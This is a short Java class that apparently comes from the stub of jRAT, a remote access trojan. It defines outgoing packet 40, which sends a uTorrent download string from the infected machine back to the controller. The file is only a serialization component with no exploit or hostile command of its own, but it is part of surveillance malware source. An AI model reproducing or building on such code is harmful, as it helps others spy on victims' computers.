package su.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import su.jrat.common.io.StringWriter;


public class Packet40UTorrentDownload extends AbstractOutgoingPacket {

	private String torrent;

	public Packet40UTorrentDownload(String torrent) {
		this.torrent = torrent;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(torrent);
	}

	@Override
	public byte getPacketId() {
		return 40;
	}

}
